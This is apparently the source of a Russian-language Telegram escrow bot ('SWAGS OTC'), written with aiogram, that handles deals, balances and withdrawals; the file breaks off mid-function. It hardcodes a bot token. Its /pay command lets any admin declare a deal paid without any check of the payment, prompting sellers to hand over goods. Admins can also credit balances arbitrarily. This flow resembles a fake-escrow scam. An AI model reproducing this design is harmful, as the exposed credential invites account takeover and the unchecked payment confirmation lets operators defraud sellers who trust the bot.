import asyncio
import json
import os
import uuid
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ========== КОНФИГ ==========
BOT_TOKEN = "8640035661:AAH3SUbbz3LhRSv-FcJbPuZo0v8oYtL6ayA"
MASTER_ADMIN_ID = 8002472821
SUPPORT_LINK = "https://t.me/swags_support_bot"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ========== ФАЙЛЫ ==========
DEALS_FILE = "deals.json"
USERS_FILE = "users.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
START_PHOTO_FILE = "start_photo.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"

def load_deals():
    if os.path.exists(DEALS_FILE):
        with open(DEALS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_deals(deals):
    with open(DEALS_FILE, 'w', encoding='utf-8') as f:
        json.dump(deals, f, indent=2, ensure_ascii=False)

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    return {MASTER_ADMIN_ID}

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(admins), f, indent=2)

def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_balance(balance):
    with open(BALANCE_FILE, 'w', encoding='utf-8') as f:
        json.dump(balance, f, indent=2, ensure_ascii=False)

def load_rekvisits():
    if os.path.exists(REKVISITS_FILE):
        with open(REKVISITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {
        "ton": "💎 ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {amount} TON",
        "stars": "⭐️ ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @swags_otc_bot\nИЛИ перешлите NFT подарок\n\nСумма: {amount} STARS",
        "rub": "₽ ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {amount} RUB",
        "uah": "₴ ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {amount} UAH"
    }

def save_rekvisits(rekvisits):
    with open(REKVISITS_FILE, 'w', encoding='utf-8') as f:
        json.dump(rekvisits, f, indent=2, ensure_ascii=False)

def load_start_photo():
    if os.path.exists(START_PHOTO_FILE):
        with open(START_PHOTO_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"file_id": None}

def save_start_photo(data):
    with open(START_PHOTO_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

def load_withdraw_requests():
    if os.path.exists(WITHDRAW_REQUESTS_FILE):
        with open(WITHDRAW_REQUESTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_withdraw_requests(requests):
    with open(WITHDRAW_REQUESTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(requests, f, indent=2, ensure_ascii=False)

deals = load_deals()
users = load_users()
admins = load_admins()
balance = load_balance()
rekvisits = load_rekvisits()
start_photo = load_start_photo()
withdraw_requests = load_withdraw_requests()
BOT_USERNAME = "swags_otc_bot"

# ========== FSM ==========
class DealStates(StatesGroup):
    waiting_for_product = State()
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_buyer_username = State()

class RekvStates(StatesGroup):
    waiting_for_rekv_type = State()
    waiting_for_rekv_text = State()

class PhotoStates(StatesGroup):
    waiting_for_photo = State()

class WithdrawStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_details = State()

class AdminAddBalanceState(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_currency = State()
    waiting_for_amount = State()

# ========== КРАСИВОЕ МЕНЮ ==========
def main_menu(user_id):
    buttons = [
        [KeyboardButton(text="📦 СОЗДАТЬ СДЕЛКУ")],
        [KeyboardButton(text="💰 МОЙ БАЛАНС")],
        [KeyboardButton(text="📋 МОИ СДЕЛКИ")],
        [KeyboardButton(text="⭐️ ПРЕМИУМ")],
        [KeyboardButton(text="❓ FAQ")],
        [KeyboardButton(text="🆘 ПОДДЕРЖКА")]
    ]
    if is_admin(user_id):
        buttons.append([KeyboardButton(text="👑 АДМИН ПАНЕЛЬ")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

def currency_keyboard():
    buttons = [
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="₽ RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="₴ UAH", callback_data="curr_UAH")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def withdraw_currency_keyboard():
    buttons = [
        [InlineKeyboardButton(text="💎 TON", callback_data="withdraw_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="withdraw_STARS")],
        [InlineKeyboardButton(text="₽ RUB", callback_data="withdraw_RUB")],
        [InlineKeyboardButton(text="₴ UAH", callback_data="withdraw_UAH")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 СМЕНИТЬ СТАРТ ФОТО", callback_data="change_photo")],
        [InlineKeyboardButton(text="💰 НАЧИСЛИТЬ БАЛАНС", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="➕ ДОБАВИТЬ АДМИНА", callback_data="add_admin")],
        [InlineKeyboardButton(text="➖ УДАЛИТЬ АДМИНА", callback_data="remove_admin")],
        [InlineKeyboardButton(text="📋 СПИСОК АДМИНОВ", callback_data="list_admins")],
        [InlineKeyboardButton(text="💳 РЕКВИЗИТЫ ОПЛАТЫ", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text="📊 ВСЕ СДЕЛКИ", callback_data="all_deals")],
        [InlineKeyboardButton(text="💸 ЗАЯВКИ НА ВЫВОД", callback_data="withdraw_requests")]
    ])

def rekvisits_edit_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 ИЗМЕНИТЬ TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ ИЗМЕНИТЬ STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="₽ ИЗМЕНИТЬ RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="₴ ИЗМЕНИТЬ UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_admin")]
    ])

def seller_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 ПЕРЕДАЛ ТОВАР", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПОЛУЧИЛ ТОВАР", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text="❓ В ПОДДЕРЖКУ", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏳ ОЖИДАНИЕ ПЕРЕДАЧИ", callback_data="noop")],
        [InlineKeyboardButton(text="❓ В ПОДДЕРЖКУ", callback_data=f"support_{deal_id}")]
    ])

def payment_method_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 ОПЛАТИТЬ ПО РЕКВИЗИТАМ", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text="💰 ОПЛАТИТЬ С БАЛАНСА", callback_data=f"pay_balance_{deal_id}")]
    ])

# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id in admins

async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass

def get_balance(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_balance(balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_balance(balance)

def get_rekvisits_text(currency, amount):
    curr_key = currency.lower()
    if curr_key in rekvisits:
        return rekvisits[curr_key].format(amount=amount, currency=currency)
    return rekvisits.get("stars", "Реквизиты не заданы").format(amount=amount, currency=currency)

async def send_welcome_message(message: types.Message):
    welcome_text = """✨ SWAGS OTC — БЕЗОПАСНЫЕ СДЕЛКИ ✨

🛡️ ПОЧЕМУ МЫ?
• 🤝 Честные сделки между продавцами и покупателями
• 💎 TON | ⭐️ STARS | ₽ RUB | ₴ UAH
• 🔒 Гарант безопасности с обеих сторон
• 💎 Премиум поддержка 24/7

📌 КАК ЭТО РАБОТАЕТ:
1️⃣ Продавец создаёт сделку
2️⃣ Продавец отправляет ссылку покупателю
3️⃣ Покупатель выбирает способ оплаты
4️⃣ Администратор проверяет оплату (или оплата с баланса)
5️⃣ Продавец нажимает «Передал товар»
6️⃣ Покупатель нажимает «Получил товар»
7️⃣ Деньги зачисляются на баланс продавца

👇 НАЧНИ ПРЯМО СЕЙЧАС 👇"""
    
    if start_photo.get("file_id"):
        try:
            await message.answer_photo(
                photo=start_photo["file_id"],
                caption=welcome_text,
                reply_markup=main_menu(message.from_user.id)
            )
            return
        except:
            pass
    
    await message.answer(
        welcome_text,
        reply_markup=main_menu(message.from_user.id)
    )

async def send_buyer_pending_message(deal_id: str):
    """Отправляет покупателю сообщение с неактивной кнопкой"""
    deal = deals[deal_id]
    keyboard = buyer_pending_keyboard(deal_id)
    
    # Пробуем отправить по username
    try:
        msg = await bot.send_message(
            deal["buyer_username"],
            f"🛒 СДЕЛКА #{deal_id} ОПЛАЧЕНА!\n\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n\n"
            f"⏳ ПРОДАВЕЦ ПОЛУЧИЛ УВЕДОМЛЕНИЕ.\n\n"
            f"⚡️ КАК ТОЛЬКО ОН ПЕРЕДАСТ ТОВАР — У ВАС ПОЯВИТСЯ КНОПКА «ПОЛУЧИЛ ТОВАР»",
            reply_markup=keyboard
        )
        deal["buyer_message_id"] = msg.message_id
        deal["buyer_chat_id"] = msg.chat.id
        save_deals(deals)
        return
    except Exception as e:
        print(f"Ошибка отправки по username: {e}")
    
    # Если есть buyer_id, пробуем отправить по ID
    if deal.get("buyer_id"):
        try:
            msg = await bot.send_message(
                deal["buyer_id"],
                f"🛒 СДЕЛКА #{deal_id} ОПЛАЧЕНА!\n\n"
                f"📦 Товар: {deal['product']}\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"👤 Продавец: @{deal['seller_username']}\n\n"
                f"⏳ ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА...",
                reply_markup=keyboard
            )
            deal["buyer_message_id"] = msg.message_id
            deal["buyer_chat_id"] = msg.chat.id
            save_deals(deals)
        except Exception as e:
            print(f"Ошибка отправки по ID: {e}")

# ========== СТАРТ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        if deal_id not in deals:
            await message.answer("❌ Сделка не найдена или уже завершена.")
            return
        
        deal = deals[deal_id]
        
        # СОХРАНЯЕМ ID ПОКУПАТЕЛЯ
        deal["buyer_id"] = message.from_user.id
        save_deals(deals)
        
        if message.from_user.username != deal["buyer_username"]:
            await message.answer(
                f"❌ ДОСТУП ЗАПРЕЩЁН!\n\nЭта сделка для @{deal['buyer_username']}\n\nОбратитесь в поддержку: {SUPPORT_LINK}"
            )
            await log_to_master(f"⚠️ НЕСАНКЦИОНИРОВАННЫЙ ЗАХОД\nСделка: #{deal_id}\nПопытался: @{message.from_user.username}\nОжидался: @{deal['buyer_username']}")
            return
        
        if deal["status"] != "waiting_payment":
            await message.answer(f"❌ Сделка уже в статусе: {deal['status']}")
            return
        
        await message.answer(
            f"🛒 СДЕЛКА #{deal_id}\n\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n\n"
            f"🔽 ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ 🔽",
            reply_markup=payment_method_keyboard(deal_id)
        )
        
        await log_to_master(
            f"👁 ПОКУПАТЕЛЬ ЗАШЁЛ В СДЕЛКУ\n"
            f"Сделка: #{deal_id}\n"
            f"Покупатель: {message.from_user.full_name} (@{message.from_user.username})"
        )
        return
    
    await send_welcome_message(message)

# ========== БАЛАНС И ВЫВОД ==========
@dp.message(F.text == "💰 МОЙ БАЛАНС")
async def show_balance(message: types.Message):
    user_balance = get_balance(message.from_user.id)
    text = f"""💰 ВАШ БАЛАНС 💰

💎 TON: {user_balance['ton']}
⭐️ STARS: {user_balance['stars']}
₽ RUB: {user_balance['rub']}
₴ UAH: {user_balance['uah']}

ДЛЯ ВЫВОДА НАЖМИТЕ КНОПКУ 👇"""
    
    await message.answer(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💸 ВЫВЕСТИ СРЕДСТВА", callback_data="start_withdraw")]
        ])
    )

@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
    user_balance = get_balance(callback.from_user.id)
    has_money = any(v > 0 for v in user_balance.values())
    
    if not has_money:
        await callback.answer("❌ У вас нет средств для вывода", show_alert=True)
        return
    
    await callback.message.answer("💰 ВЫБЕРИТЕ ВАЛЮТУ ДЛЯ ВЫВОДА:", reply_markup=withdraw_currency_keyboard())
    await state.set_state(WithdrawStates.waiting_for_currency)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("withdraw_"))
async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    user_balance = get_balance(callback.from_user.id)
    curr_key = currency.lower()
    
    if user_balance.get(curr_key, 0) <= 0:
        await callback.answer(f"❌ У вас нет средств в {currency}", show_alert=True)
        return
    
    await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])
    
    if currency == "STARS":
        await callback.message.answer("⭐️ ВВЕДИТЕ ВАШ TELEGRAM USERNAME ДЛЯ ПОЛУЧЕНИЯ ЗВЁЗД:\n\nПРИМЕР: @john_doe")
    else:
        await callback.message.answer(f"💸 ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА {currency}:\n\nПРИМЕР ДЛЯ TON: UQ...\nПРИМЕР ДЛЯ RUB/UAH: НОМЕР КАРТЫ ИЛИ КОШЕЛЁК")
    
    await state.set_state(WithdrawStates.waiting_for_details)
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_details)
async def withdraw_details(message: types.Message, state: FSMContext):
    data = await state.get_data()
    currency = data["withdraw_currency"]
    amount = data["withdraw_amount"]
    details = message.text.strip()
    
    request_id = str(uuid.uuid4())[:8]
    withdraw_requests[request_id] = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "full_name": message.from_user.full_name,
        "currency": currency,
        "amount": amount,
        "details": details,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_withdraw_requests(withdraw_requests)
    
    await bot.send_message(
        MASTER_ADMIN_ID,
        f"💸 НОВАЯ ЗАЯВКА НА ВЫВОД #{request_id}\n\n"
        f"👤 Пользователь: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"📝 Реквизиты: {details}\n\n"
        f"ДЛЯ ПОДТВЕРЖДЕНИЯ: /confirm_withdraw {request_id}"
    )
    
    await message.answer(
        f"✅ ЗАЯВКА НА ВЫВОД #{request_id} СОЗДАНА!\n\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"⏳ ОЖИДАЙТЕ ВЫВОДА В ТЕЧЕНИЕ 1-5 МИНУТ.\n\n"
        f"СТАТУС ЗАЯВКИ: /withdraw_status {request_id}"
    )
    
    await log_to_master(f"💸 Новая заявка на вывод: #{request_id} от @{message.from_user.username}")
    await state.clear()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔️ НЕДОСТАТОЧНО ПРАВ")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❌ ИСПОЛЬЗОВАНИЕ: /confirm_withdraw [ID ЗАЯВКИ]")
        return
    
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ ЗАЯВКА {request_id} НЕ НАЙДЕНА")
        return
    
    req = withdraw_requests[request_id]
    if req["status"] != "pending":
        await message.answer(f"❌ ЗАЯВКА УЖЕ ОБРАБОТАНА: {req['status']}")
        return
    
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    req["completed_by"] = message.from_user.id
    save_withdraw_requests(withdraw_requests)
    
    user_balance = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if user_balance.get(curr_key, 0) >= req["amount"]:
        user_balance[curr_key] -= req["amount"]
        save_balance(balance)
    
    try:
        await bot.send_message(
            req["user_id"],
            f"✅ ВЫВОД СРЕДСТВ ПОДТВЕРЖДЁН!\n\n"
            f"💰 Сумма: {req['amount']} {req['currency']}\n"
            f"📝 Реквизиты: {req['details']}\n\n"
            f"СРЕДСТВА ОТПРАВЛЕНЫ В ТЕЧЕНИЕ 1-5 МИНУТ."
        )
    except:
        pass
    
    await message.answer(f"✅ ВЫВОД #{request_id} ПОДТВЕРЖДЁН! СРЕДСТВА СПИСАНЫ С БАЛАНСА.")
    await log_to_master(f"✅ Вывод #{request_id} подтверждён админом @{message.from_user.username}")

@dp.message(Command("withdraw_status"))
async def withdraw_status(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❌ ИСПОЛЬЗОВАНИЕ: /withdraw_status [ID ЗАЯВКИ]")
        return
    
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ ЗАЯВКА {request_id} НЕ НАЙДЕНА")
        return
    
    req = withdraw_requests[request_id]
    status_text = {
        "pending": "⏳ В ОБРАБОТКЕ",
        "completed": "✅ ВЫПОЛНЕН"
    }.get(req["status"], req["status"])
    
    await message.answer(
        f"📋 СТАТУС ЗАЯВКИ #{request_id}\n\n"
        f"💰 Сумма: {req['amount']} {req['currency']}\n"
        f"📅 Создана: {req['created_at'][:19]}\n"
        f"📊 Статус: {status_text}"
    )

# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.message(F.text == "📦 СОЗДАТЬ СДЕЛКУ")
async def create_deal_start(message: types.Message, state: FSMContext):
    await message.answer("📝 ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ:\n\nПРИМЕР: NFT-подарок Telegram Premium")
    await state.set_state(DealStates.waiting_for_product)

@dp.message(DealStates.waiting_for_product)
async def get_product(message: types.Message, state: FSMContext):
    await state.update_data(product=message.text.strip())
    await message.answer("💱 ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ:", reply_markup=currency_keyboard())
    await state.set_state(DealStates.waiting_for_currency)

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.edit_text(f"💰 ВВЕДИТЕ СУММУ СДЕЛКИ (ТОЛЬКО ЧИСЛО):\nВАЛЮТА: {currency}")
    await state.set_state(DealStates.waiting_for_amount)
    await callback.answer()

@dp.message(DealStates.waiting_for_amount)
async def get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer("👤 ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ (БЕЗ @):\n\nПРИМЕР: john_doe\n\n⚠️ ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ!")
        await state.set_state(DealStates.waiting_for_buyer_username)
    except:
        await message.answer("❌ ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО, НАПРИМЕР: 1500")

@dp.message(DealStates.waiting_for_buyer_username)
async def get_buyer(message: types.Message, state: FSMContext):
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()
    
    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username,
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None,
        "buyer_message_id": None,
        "buyer_chat_id": None
    }
    save_deals(deals)
    
    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    
    await message.answer(
        f"✅ СДЕЛКА #{deal_id} СОЗДАНА!\n\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"📦 Товар: {data['product']}\n"
        f"👤 Покупатель: @{buyer_username}\n\n"
        f"🔗 ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ (ПРОСТО СКОПИРУЙТЕ ИЛИ ПЕРЕШЛИТЕ):\n\n"
        f"{deal_link}\n\n"
        f"⚡️ ПОСЛЕ ТОГО КАК ПОКУПАТЕЛЬ ОПЛАТИТ, ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ."
    )
    
    await log_to_master(
        f"🆕 СОЗДАНА СДЕЛКА\n"
        f"ID: #{deal_id}\n"
        f"Продавец: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Покупатель: @{buyer_username}\n"
        f"Сумма: {data['amount']} {data['currency']}\n"
        f"Товар: {data['product']}"
    )
    await state.clear()

# ========== ОПЛАТА ПО РЕКВИЗИТАМ ==========
@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
async def pay_by_rekvisits(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"❌ СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
        return
    
    pay_text = get_rekvisits_text(deal["currency"], deal["amount"])
    
    await callback.message.edit_text(
        f"🛒 СДЕЛКА #{deal_id}\n\n"
        f"📦 Товар: {deal['product']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:\n{pay_text}\n\n"
        f"✨ ПОСЛЕ ОПЛАТЫ АДМИНИСТРАТОР ПРОВЕРИТ ПЛАТЁЖ КОМАНДОЙ /pay {deal_id} ✨"
    )
    
    await callback.answer()

# ========== ОПЛАТА С БАЛАНСА ==========
@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
async def pay_by_balance(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"❌ СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
        return
    
    buyer_balance = get_balance(callback.from_user.id)
    curr_key = deal["currency"].lower()
    
    if buyer_balance.get(curr_key, 0) < deal["amount"]:
        await callback.answer(f"❌ НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ!\nНУЖНО: {deal['amount']} {deal['currency']}\nДОСТУПНО: {buyer_balance.get(curr_key, 0)}", show_alert=True)
        return
    
    buyer_balance[curr_key] -= deal["amount"]
    save_balance(balance)
    
    deal["status"] = "paid"
    deal["paid_by_admin"] = callback.from_user.id
    save_deals(deals)
    
    await callback.message.edit_text(
        f"✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
        f"СДЕЛКА #{deal_id}\n"
        f"СПИСАНО С БАЛАНСА: {deal['amount']} {deal['currency']}\n\n"
        f"ПРОДАВЕЦ ПОЛУЧИТ УВЕДОМЛЕНИЕ ДЛЯ ПЕРЕДАЧИ ТОВАРА."
    )
    
    await send_buyer_pending_message(deal_id)
    
    await bot.send_message(
        deal["seller_id"],
        f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА! 💎\n\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"📦 Товар: {deal['product']}\n"
        f"👤 Покупатель: @{deal['buyer_username']}\n\n"
        f"👇 НАЖМИТЕ КНОПКУ, КОГДА ПЕРЕДАДИТЕ ТОВАР 👇",
        reply_markup=seller_confirm_keyboard(deal_id)
    )
    
    await log_to_master(f"💰 Сделка #{deal_id} оплачена с баланса @{callback.from_user.username}")
    await callback.answer()

# ========== КОМАНДА /PAY ДЛЯ АДМИНА ==========
@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔️ НЕДОСТАТОЧНО ПРАВ")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❌ ИСПОЛЬЗОВАНИЕ: /pay [ID СДЕЛКИ]\nПРИМЕР: /pay a3f2b1c4")
        return
    
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"❌ СДЕЛКА С ID {deal_id} НЕ НАЙДЕНА")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
        return
    
    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_deals(deals)
    
    await message.answer(f"✅ ОПЛАТА ПОДТВЕРЖДЕНА ДЛЯ СДЕЛКИ {deal_id}")
    
    await send_buyer_pending_message(deal_id)
    
    await bot.send_message(
        deal["seller_id"],
        f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА! 💎\n\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"📦 Товар: {deal['product']}\n"
        f"👤 Покупатель: @{deal['buyer_username']}\n\n"
        f"👇 НАЖМИТЕ КНОПКУ, КОГДА ПЕРЕДАДИТЕ ТОВАР 👇",
        reply_markup=seller_confirm_keyboard(deal_id)
    )
    
    await log_to_master(
        f"💸 ОПЛАТА ПОДТВЕРЖДЕНА\n"
        f"Сделка: #{deal_id}\n"
        f"Админ: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Продавец: @{deal['seller_username']}\n"
        f"Сумма: {deal['amount']} {deal['currency']}"
    )

# ========== ПРОДАВЕЦ ПОДТВЕРЖДАЕТ ПЕРЕДАЧУ ==========
@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_delivered(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[-1]
    if deal_id not in deals:
        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer("❌ ОПЛАТА ЕЩЁ НЕ ПОДТВЕРЖДЕНА")
        return
    
    deal["status"] = "awaiting_confirmation"
    save_deals(deals)
    
    await callback.message.edit_text(
        f"✅ ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА!\n\n"
        f"📦 Товар: {deal['product']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"👤 Покупатель: @{deal['buyer_username']}\n\n"
        f"⏳ ОЖИДАЕМ ПОДТВЕРЖДЕНИЯ ОТ ПОКУПАТЕЛЯ..."
    )
    
    active_keyboard = buyer_confirm_keyboard(deal_id)
    updated = False
    
    # Пробуем обновить существующее сообщение
    if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
        try:
            await bot.edit_message_reply_markup(
                chat_id=deal["buyer_chat_id"],
                message_id=deal["buyer_message_id"],
                reply_markup=active_keyboard
            )
            updated = True
        except Exception as e:
            print(f"Не удалось обновить клавиатуру: {e}")
    
    # Если не обновилось — отправляем новое сообщение
    if not updated:
        try:
            # Пробуем отправить по username
            await bot.send_message(
                deal["buyer_username"],
                f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР ПО СДЕЛКЕ #{deal_id}!\n\n"
                f"📦 Товар: {deal['product']}\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"👤 Продавец: @{deal['seller_username']}\n\n"
                f"✅ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
                reply_markup=active_keyboard
            )
        except:
            # Если есть buyer_id
            if deal.get("buyer_id"):
                try:
                    await bot.send_message(
                        deal["buyer_id"],
